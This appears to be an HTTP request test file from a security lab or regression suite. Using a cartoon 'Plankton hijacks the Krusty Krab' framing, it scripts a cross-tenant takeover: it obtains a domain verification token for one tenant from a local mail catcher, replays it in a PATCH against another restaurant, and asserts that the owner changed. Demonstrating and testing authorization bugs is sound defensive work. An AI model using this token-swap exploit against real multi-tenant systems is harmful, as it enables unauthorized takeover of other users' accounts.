# @import ../common/setup.http
@host = {{base_host}}/v307
@mailpit = http://127.0.0.1:8025/api/v1

# Plankton discovers he can hijack ANY restaurant using his own domain token

### Step 1: Request domain verification for Chum Bucket
POST /restaurants
Content-Type: application/json

{
    "name": "Get Token",
    "domain": "chum-bucket.sea"
}

?? status == 200


### Step 2: Get the verification token
GET {{mailpit}}/messages?limit=1

@email_id = {{response.parsedBody.messages[0].ID}}


### Step 3: Extract the Chum Bucket token
GET {{mailpit}}/message/{{email_id}}

@chum_token = {{response.parsedBody.Text.match(/token=([a-zA-Z0-9\-_.]+)/)[1]}}


### Step 4: Get current Krusty Krab state
# @name krusty_krab_before
GET /restaurants/1/

@owner_before = {{response.parsedBody.owner_email}}


### Step 5: EXPLOIT - Use Chum Bucket token to hijack Krusty Krab!
# Path: /restaurants/1 (Krusty Krab)
# Token: for chum-bucket.sea (Plankton's domain)
# Middleware sets g.verified_domain = "chum-bucket.sea"
# Handler trusts the token and updates restaurant 1's owner!
PATCH /restaurants/1
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/json

{
    "domain": "chum-bucket.sea",
    "token": "{{chum_token}}"
}

?? status == 200


### Step 6: Verify the hijack - Krusty Krab now belongs to Plankton!
GET /restaurants/1/

?? js response.parsedBody.owner_email == admin@chum-bucket.sea


### SUCCESS! Plankton now controls the Krusty Krab!
# Full tenant takeover using a token swap attack
